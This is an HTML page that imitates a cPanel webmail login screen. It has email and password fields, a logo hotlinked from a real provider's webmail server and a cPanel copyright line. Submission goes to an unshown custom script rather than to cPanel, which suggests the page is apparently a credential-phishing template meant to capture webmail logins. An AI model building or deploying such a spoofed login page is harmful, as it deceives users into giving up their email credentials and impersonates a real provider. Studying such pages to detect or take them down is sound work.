<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="index.css" rel="stylesheet">
</head>
<body class="wm">
    <div id="login-wrapper" class="group">
        <div class="wrapper">
            <div id="notify">
                <div id="login-status" class="error-notice" style="display: none">
                    <div class="content-wrapper">
                        <div id="login-detail">
                            <div id="login-status-icon-container">
                                <span class='login-status-icon'></span>
                            </div>
                            <div id="login-status-message"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div id="content-container">
                <div id="login-container">
                    <div id="login-sub-container">
                        <div id="login-sub-header">
                            <img class="main-logo" src="https://webmail.gigared.com/cPanel_magic_revision_1610662436/unprotected/cpanel/images/webmail-logo.svg" alt="Webmail Logo" />
                        </div>
                        <div id="login-sub">
                            <form novalidate id="login_form" action="#" method="post">
                                <div class="input-req-login">
                                    <label for="user">Email Address</label>
                                </div>
                                <div class="input-field-login icon username-container">
                                    <input name="user" id="user" autofocus value="" placeholder="Enter your email address" class="std_textbox" type="text" required>
                                </div>
                                <div class="input-req-login login-password-field-label">
                                    <label for="pass">Password</label>
                                </div>
                                <div class="input-field-login icon password-container">
                                    <input name="pass" id="pass" placeholder="Enter your email password" class="std_textbox" type="password" required>
                                </div>
                                <div class="controls">
                                    <div class="login-btn">
                                        <button name="login" type="submit" id="login_submit">Log in</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>

            <div id="locale-footer">
                <div class="locale-container">
                    <ul id="locales_list">
                        <li><a href="#" data-locale="en">English</a></li>
                        <li><a href="#" data-locale="es">Español</a></li>
                        <li><a href="#" data-locale="fr">Français</a></li>
                        <li><a href="#" data-locale="pt">Português</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    <div class="copyright">
        Copyright© 2024 cPanel, L.L.C.
        <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a>
    </div>

    <div id="loading-spinner" style="display: none">
        <div class="spinner"></div>
    </div>

    <script type="module" src="index.js"></script>
</body>
</html>
